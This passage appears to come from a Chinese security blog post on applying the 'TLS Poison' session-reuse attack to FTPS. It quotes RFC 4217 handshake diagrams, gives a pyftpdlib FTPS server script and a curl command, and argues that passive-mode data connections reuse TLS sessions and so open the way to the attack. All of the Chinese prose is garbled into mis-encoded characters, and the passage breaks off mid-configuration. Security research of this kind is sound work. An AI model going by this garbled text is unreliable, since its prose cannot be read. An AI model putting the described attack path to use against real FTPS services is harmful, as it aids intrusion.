æœåŠ¡å™¨æ¥ç¡®å®šæ”¯æŒå“ªäº›æœºåˆ¶ï¼Œå°½ç®¡æœåŠ¡å™¨ä¸ä¸€å®šéœ€è¦è¯šå®åœ°æŠ«éœ²å®ƒä»¬æ”¯æŒå“ªäº›å®‰å…¨çº§åˆ«ã€‚è°ƒç”¨ FTPS å®‰å…¨çš„å¸¸è§æ–¹æ³•åŒ…æ‹¬ AUTH TLS å’Œ AUTH SSL ã€‚æ˜¾å¼æ–¹æ³•åœ¨ RFC 4217 ä¸­å®šä¹‰åï¼ŒFTPSçš„åˆè§„æ€§è¦æ±‚å®¢æˆ·ç«¯å§‹ç»ˆä½¿ç”¨ AUTH TLS æ–¹æ³•è¿›è¡Œåå•†ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥åœ¨ RFC 4217 ä¸­æ‰¾åˆ°æ˜¾å¼ FTPS å»ºç«‹è¿æ¥æ–¹å¼ï¼š</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">          <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">  control          data                   data               control</span><br><span class="line">====================================================================</span><br><span class="line"></span><br><span class="line">                                                             socket()</span><br><span class="line">                                                             bind()</span><br><span class="line">  socket()</span><br><span class="line">  connect()  ----------------------------------------------&gt; accept()</span><br><span class="line">            &lt;----------------------------------------------  220</span><br><span class="line">  AUTH TLS   ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  234</span><br><span class="line">  TLSneg()  &lt;----------------------------------------------&gt; TLSneg()</span><br><span class="line">  PBSZ 0     ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  200</span><br><span class="line">  PROT P     ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  200</span><br><span class="line"> <span class="hljs-built_in"> USER </span>fred  ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  331</span><br><span class="line">  PASS pass  ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  230</span><br><span class="line"></span><br><span class="line">Note 1: The order of the PBSZ/PROT pair <span class="hljs-keyword">and</span> the USER/PASS pair (with</span><br><span class="line">respect <span class="hljs-keyword">to</span> each other) is <span class="hljs-keyword">not</span> important (i.e., the USER/PASS can</span><br><span class="line">happen prior <span class="hljs-keyword">to</span> the PBSZ/PROT, <span class="hljs-keyword">or</span> the<span class="hljs-built_in"> server </span>can refuse <span class="hljs-keyword">to</span> allow a</span><br><span class="line">PBSZ/PROT pair until the USER/PASS pair has happened).</span><br><span class="line"></span><br><span class="line">Note 2: The PASS command might <span class="hljs-keyword">not</span> be required at all (<span class="hljs-keyword">if</span> the USER</span><br><span class="line">parameter <span class="hljs-keyword">and</span> any<span class="hljs-built_in"> client identity </span>presented provide sufficient</span><br><span class="line">authentication).  The<span class="hljs-built_in"> server </span>would indicate this by issuing a <span class="hljs-string">'232'</span></span><br><span class="line">reply <span class="hljs-keyword">to</span> the<span class="hljs-built_in"> USER </span>command instead of the <span class="hljs-string">'331'</span>, which requests a PASS</span><br><span class="line"><span class="hljs-keyword">from</span> the<span class="hljs-built_in"> client </span>(see below).</span><br><span class="line"></span><br><span class="line">Note 3: The AUTH command might <span class="hljs-keyword">not</span> be the first command after the</span><br><span class="line">receipt of the 220 welcome message.</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ•°æ®ä¼ è¾“é˜¶æ®µï¼š</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">12.6.  A Standard Data Transfer with Protection</span><br><span class="line"></span><br><span class="line">             <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">     control          data                   data               control</span><br><span class="line">   ====================================================================</span><br><span class="line"></span><br><span class="line">                      socket()</span><br><span class="line">                      bind()</span><br><span class="line">    <span class="hljs-built_in"> PORT </span>w,x,y,z,a,b --------------------------------------------&gt;</span><br><span class="line">         &lt;-------------------------------------------------------- 200</span><br><span class="line">     STOR file ---------------------------------------------------&gt;</span><br><span class="line">                                             socket()</span><br><span class="line">                                             bind()</span><br><span class="line">         &lt;-------------------------------------------------------- 150</span><br><span class="line">                      accept()  &lt;----------  connect()</span><br><span class="line">                      TLSneg()  &lt;----------&gt; TLSneg()</span><br><span class="line">                      TLSwrite() ----------&gt; TLSread()</span><br><span class="line">                      TLSshutdown() -------&gt; TLSshutdown()</span><br><span class="line">                      close()    ----------&gt; close()</span><br><span class="line">         &lt;-------------------------------------------------------- 226</span><br><span class="line"></span><br><span class="line">12.7.  A Firewall-Friendly Data Transfer with Protection</span><br><span class="line"></span><br><span class="line">             <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">     control          data                   data               control</span><br><span class="line">   ====================================================================</span><br><span class="line"></span><br><span class="line">     PASV --------------------------------------------------------&gt;</span><br><span class="line">                                             socket()</span><br><span class="line">                                             bind()</span><br><span class="line">         &lt;------------------------------------------ 227 (w,x,y,z,a,b)</span><br><span class="line">                      socket()</span><br><span class="line">     STOR file ---------------------------------------------------&gt;</span><br><span class="line">                      connect()  ----------&gt; accept()</span><br><span class="line">         &lt;-------------------------------------------------------- 150</span><br><span class="line">                      TLSneg()   &lt;---------&gt; TLSneg()</span><br><span class="line">                      TLSwrite()  ---------&gt; TLSread()</span><br><span class="line">                      TLSshutdown() -------&gt; TLSshutdown()</span><br><span class="line">                      close()     ---------&gt; close()</span><br><span class="line">         &lt;-------------------------------------------------------- 226</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="TLS-Poison-In-FTPS"><a href="#TLS-Poison-In-FTPS" class="headerlink" title="TLS Poison In FTPS"></a>TLS Poison In FTPS</h2><p>çœ‹åˆ°å¦‚ä¸Šè§£é‡Šï¼Œæƒ³å¿…å¤§å®¶å¯èƒ½ä¹Ÿä¼šæœ‰æ€è€ƒï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯ FTPS ä¹Ÿä¼šæœ‰ TLS ä¼šè¯é‡ç”¨çš„ç‰¹æ€§å‘¢ï¼Ÿé‚£ä¹ˆæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥è·Ÿ TLS Poison ç›¸å…³è”èµ·æ¥å‘¢ï¼Ÿ</p><h3 id="Explicit"><a href="#Explicit" class="headerlink" title="Explicit"></a>Explicit</h3><p>é¦–å…ˆæˆ‘ä»¬æ¥å…ˆçœ‹çœ‹æ‹¥æœ‰ RFC 4217 è§„èŒƒçš„æ˜¾ç¤º FTPS ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”¨ pyftpdlib æ¥åšä¸€ä¸ªç®€å•çš„ FTPS Server</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">An RFC-4217 asynchronous FTPS server supporting both SSL and TLS.</span></span><br><span class="line"><span class="hljs-string">Requires PyOpenSSL module (http://pypi.python.org/pypi/pyOpenSSL).</span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer</span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> TLS_FTPHandler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    authorizer = DummyAuthorizer()</span><br><span class="line">    <span class="hljs-comment"># authorizer.add_user('ftpuser', 'ftpuser123', '.', perm='elradfmwMT')</span></span><br><span class="line">    authorizer.add_anonymous(<span class="hljs-string">'.'</span>)</span><br><span class="line">    handler = TLS_FTPHandler</span><br><span class="line">    handler.certfile = <span class="hljs-string">'keycert.pem'</span></span><br><span class="line">    handler.authorizer = authorizer</span><br><span class="line">    <span class="hljs-comment"># requires SSL for both control and data channel</span></span><br><span class="line">    handler.tls_control_required = <span class="hljs-literal">True</span></span><br><span class="line">    handler.tls_data_required = <span class="hljs-literal">True</span></span><br><span class="line">    server = FTPServer((<span class="hljs-string">''</span>, <span class="hljs-number">11211</span>), handler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¯¹äºå®¢æˆ·ç«¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ curl æ¥å‘èµ·ä¸€ä¸ªæ˜¾å¼ FTPS è¯·æ±‚ï¼š</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ftp-ssl --user name:passwd ftp://ftp.host.com/</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¦‚æœéœ€è¦ç”¨æˆ·éªŒè¯å°±åŠ ä¸Š<code>--user</code>é€‰é¡¹å³å¯ï¼Œä¸éœ€è¦çš„è¯å°±ä¸ç”¨ï¼Œç»“æœå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°åœ¨æ˜¾å¼ FTPS åœ¨ä½¿ç”¨<code>AUTH SSL</code>å‘½ä»¤ä¹‹åæ‰ä¸æœåŠ¡å™¨å»ºç«‹çš„ TLS è¿æ¥ï¼Œå¹¶åœ¨<code>LIST</code>ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‡æ–°ä½¿ç”¨äº† TLS Session ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç®€å•å›é¡¾ä¸€ä¸‹ï¼Œåœ¨åˆ©ç”¨ HTTPS è¿›è¡Œ TLS Poison æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡ä½¿ç”¨ HTTP é‡å®šå‘è®©å®¢æˆ·ç«¯é‡æ–°ä¸æˆ‘ä»¬å»ºç«‹ä¼šè¯ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿ FTPS ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ä½¿ç”¨ç±»ä¼¼ HTTPS é‡å®šå‘çš„åŠŸèƒ½è®©å…¶å†æ¬¡ä¸ FTPS æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬åªæ˜¯ç®€å•è®¿é—®ä¸€æ¬¡ FTPS æœåŠ¡å™¨å°±ä¼šäº§ç”Ÿä¼šè¯é‡ç”¨çš„ç°è±¡å‘¢ï¼Ÿ</p><p>è®©æˆ‘ä»¬çœ‹ä¹‹å‰å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå®¢æˆ·ç«¯ä½¿ç”¨äº†<code>EPSV</code>å‘½ä»¤è¡¨ç¤ºä½¿ç”¨ FTP è¢«åŠ¨æ¨¡å¼ï¼ŒFTP æœåŠ¡å™¨ä»¥<code>(||||32949)</code>å¯¹è¯¥å‘½ä»¤è¿›è¡Œäº†å›å¤ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç®€å•å›é¡¾ä¸€ä¸‹ FTP çš„è¢«åŠ¨æ¨¡å¼ï¼šåœ¨è¢«åŠ¨æ¨¡å¼çš„ FTP ä¸­ï¼Œå®¢æˆ·ç«¯å¯åŠ¨åˆ°æœåŠ¡å™¨çš„ä¸¤ä¸ªè¿æ¥ï¼Œ<strong>è§£å†³äº†é˜²ç«å¢™é˜»æ­¢ä»æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„ä¼ å…¥æ•°æ®ç«¯å£è¿æ¥çš„é—®é¢˜</strong>ã€‚FTP è¿æ¥å»ºç«‹åï¼Œå®¢æˆ·ç«¯åœ¨æœ¬åœ°æ‰“å¼€ä¸¤ä¸ªéšæœºçš„éç³»ç»Ÿç«¯å£ N å’Œ N + 1(N &gt; 1023)ã€‚ç¬¬ä¸€ä¸ªç«¯å£è¿æ¥æœåŠ¡å™¨ä¸Šçš„ 21 ç«¯å£ï¼Œä½†æ˜¯å®¢æˆ·ç«¯è¿™æ¬¡å°†ä¼šå‘å‡º PASV å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ä¸å…è®¸æœåŠ¡å™¨è¿æ¥å›å…¶æ•°æ®ç«¯å£ã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨éšåä¼šæ‰“å¼€ä¸€ä¸ªéšæœºçš„éç³»ç»Ÿç«¯å£ P (P &gt; 1023)ï¼Œå¹¶å°† P å‘é€ç»™å®¢æˆ·ç«¯ä½œä¸º PASV å‘½ä»¤çš„å“åº”ã€‚ç„¶åå®¢æˆ·ç«¯å¯åŠ¨ä»ç«¯å£ N+1 åˆ°ç«¯å£ P çš„è¿æ¥æ¥ä¼ è¾“æ•°æ®ã€‚å…¶ä¸­<code>EPSV</code>å‘½ä»¤ä¸º<code>PASV</code>çš„æ›´æ–°ç‰ˆæœ¬ï¼Œä¸»è¦ä¸ºäº†å…¼å®¹ IPv6 è€Œåœ¨ RFC 2428 ä¸­å®šä¹‰çš„ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png" alt=""></p><p>æ‰€ä»¥åœ¨è¢«åŠ¨æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”±ä¸Šå›¾æ¸…æ¥šçš„æ˜ç™½ï¼Œåœ¨æ•°æ®ä¼ è¾“é˜¶æ®µï¼Œå®¢æˆ·ç«¯éœ€è¦ä¸æœåŠ¡ç«¯é‡æ–°å»ºç«‹ä¸€æ¬¡è¿æ¥ï¼è€Œåœ¨æ˜¾å¼ FTPS å½“ä¸­ï¼Œé‡æ–°å»ºç«‹è¿æ¥å°±å¯ä»¥é‡æ–°ä½¿ç”¨ TLS ä¼šè¯ï¼Œä¹Ÿå°±æ„å‘³ç€å¯èƒ½è¢« TLS Poison æ”»å‡»ï¼</p><h3 id="Implicit"><a href="#Implicit" class="headerlink" title="Implicit"></a>Implicit</h3><p>å¯¹äºéšå¼æ¨¡å¼ï¼Œå› ä¸ºä¸€å¼€å§‹å°±éœ€è¦å»ºç«‹ TLS ä¼šè¯ï¼Œæ‰€ä»¥å³ä½¿æ²¡æœ‰ RFC è§„å®šï¼Œç†è®ºä¸Šä¹Ÿå¾ˆæ˜æ˜¾åº”è¯¥ä¹ŸåŒæ ·ä¼šæ”¯æŒ TLS ä¼šè¯é‡ç”¨çš„æœºåˆ¶ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ vsftpd æ¥è¿›è¡Œç®€å•å®éªŒï¼Œå®‰è£… vsftpd ååœ¨ /etc/vsftp.conf ä¸­å¼€å¯<code>implicit_ssl=YES</code>é€‰é¡¹</p><p>å‚è€ƒé…ç½®ï¼š</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 